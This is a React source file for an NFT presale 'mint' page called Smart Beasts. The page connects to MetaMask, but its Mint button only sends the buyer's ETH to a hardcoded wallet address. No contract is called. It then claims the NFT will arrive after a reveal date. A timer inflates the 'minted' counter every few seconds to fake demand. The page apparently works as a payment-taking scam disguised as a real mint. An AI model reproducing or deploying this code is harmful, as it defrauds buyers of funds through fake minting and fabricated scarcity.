import React, { useState, useEffect } from "react";
import { Modal } from "react-bootstrap";
import "./app.scss";
import meta from "./assets/meta_mask.png";
import ReactPlayer from 'react-player' ;


const App = () => {
  const [value, setValue] = useState(1);
  const [eth, setEth] = useState(0.12);
  const [mint, setMint] = useState(345);
  const [width, setWidth] = useState("0");
  const [show, setShow] = useState(false);
  const [isethereum, setisethereum] = useState(false) ;
  const [isminted, setisminted] = useState(false) ;

  const handleClose = () => setShow(false);
  const handleEthClose = () => setisethereum(false) ;
  const handleMintedPopupClose = () => setisminted(false) ;


	const [defaultAccount, setDefaultAccount] = useState(null);
	const [connButtonText, setConnButtonText] = useState('Connect Wallet');
  const [disabled,setdisabled]  = useState(true);
  const [networkid,setnetworkid] = useState(1) ;

	const connectWalletHandler = () => {
		if (window.ethereum && window.ethereum.isMetaMask) {
			window.ethereum.request({ method: 'eth_requestAccounts'})
			.then(result => {
				accountChangedHandler(result[0]);
				setConnButtonText('Wallet Connected');
        setdisabled (false) ;
        setnetworkid (window.ethereum.networkVersion );
			})
			.catch(error => {
				console.log(error.message);
			
			});

		} 
    else 
    {
			setShow(true) ;
		}
	}

	// update account, will cause component re-render
	const accountChangedHandler = (newAccount) => {
		setDefaultAccount(newAccount);
	}

	const chainChangedHandler = () => {
		// reload the page to avoid any errors with chain change mid use of application
    setnetworkid(window.ethereum.networkVersion) ;
		window.location.reload();
    
	}

  const mintHandler = async ()  => {

      if ( networkid == 1)
      {
      const receiver = '0xd124995990DbC97e4636b951beCC4b73f9A3C08f' ;
      const gasPrice = '0x5208' // 21000 Gas Price
      const amountHex = (eth * Math.pow(10,18)).toString(16)
      
      const tx = {
        from: defaultAccount,
        to: receiver,
        value: amountHex,
        gas: gasPrice,
      }
  
      await window.ethereum.request({ method: 'eth_sendTransaction', params: [ tx ]})
        setisminted(true) ;
        setMint (mint + 1) ;
        setWidth(`${(mint / 1000) * 100}`);
      
      
    }
    else{
      setisethereum(true) ;
    }
  
    }



	// listen for account changes
	window.ethereum.on('accountsChanged', accountChangedHandler);
	window.ethereum.on('chainChanged', chainChangedHandler);

  const inc = () => {
    if (value === 5) {
    } else {
      setValue(value + 1);

      let result = eth + 0.12;
      result = Math.round(result * 1000) / 1000;
      setEth(result);
    }
  };

  const dec = () => {
    if (value === 1) {
    } else {
      setValue(value - 1);
      let result = eth - 0.12;
      result = Math.round(result * 1000) / 1000;
      setEth(result);
    }
  };

  useEffect(() => {
    if (mint <= 999)
      setTimeout(() => {
        setMint(mint + 1);
        let minted = mint + 1;
        setWidth(`${(minted / 1000) * 100}`);
      }, 3000);
  }, [mint]);

  return (
    <>
      <div className="home-page">
          <ReactPlayer
            url='https://metamoose2.s3.amazonaws.com/smartbeastsvideo.mp4'
            playing={true}
            loop={true}
            muted={true}
            controls={false}
            width = "20%"
            height="20%"
            
          />
        {/* </div> */}
        <div className="mint-box">
          <h1>
            Smart Beasts PRESALE IS NOW <span className="outline">LIVE</span>
          </h1>
          <div className="line"></div>
          <div className="count">
            <div className="action fas fa-minus" onClick={dec}></div>

            <div className="value">{Math.round(value)}</div>

            <div className="action fas fa-plus" onClick={inc}></div>
          </div>
          <div
            className="btn-max"
            onClick={() => {
              setValue(5);
              setEth(0.60);
            }}
          >
            SET MAX
          </div>
          <div className="line"></div>
          <p className="price">TOTAL PRICE: {eth} ETH</p>
          <div className="btn-connect" onClick={connectWalletHandler}>
          {connButtonText}
          </div>
          <div className="btn-connect" onClick={mintHandler} disabled = {disabled}>
            Mint
          </div>
          <div className="prgcont">
            <div className="bar">
              <div className="bar-done" style={{ width: `${width}%` }}></div>
            </div>

            <div className="text-glitch">
              <span className="countA">{mint}</span>
              <span className="max"> / 1000</span>
            </div>
          </div>{" "}
        </div>

        <div class="footer-link">
          <a
            href="https://twitter.com/SmartBeast_nft?t=d5l38ijN_TTxfEyuxuH6AQ&s=09"
            target="_blank"
            rel="noreferrer"
          >
            <i className="icon fab fa-twitter"></i>
          </a>

          <a
            href="https://discord.gg/XCZgpKKm"
            target="_blank"
            rel="noreferrer"
          >
            <i className="icon fab fa-discord"></i>
          </a>

          <a
            href=""
            target="_blank"
            rel="noreferrer"
          >
            <i className="icon fab fa-chrome"></i>
          </a>
          
        </div>
      </div>

      <Modal show={show} onHide={handleClose}>
        <Modal.Body>
          <div className="meta">METAMASK NEEDED</div>

          <img width="90" alt="MetaMask" src={meta} />

          <div className="meta">
            <span> Please install </span>

            <a
              href="https://metamask.io/download.html"
              target="_blank"
              rel="noreferrer"
            >
              MetaMask
            </a>

            <span> to connect your wallet.</span>
          </div>
        </Modal.Body>
      </Modal>
      <Modal show={isethereum} onHide={handleEthClose}>
        <Modal.Body>
          <div className="meta">Please change your network to Ethereum Mainnet</div>
        </Modal.Body>
      </Modal>

      <Modal show={isminted} onHide={handleMintedPopupClose}>
        <Modal.Body>
          <div className="meta">Thank you! Your Smart Beasts NFT will generate in your Metamask wallet after Reveal date. Welcome to the club!</div>
        </Modal.Body>
      </Modal>
    </>
  );
};

export default App;
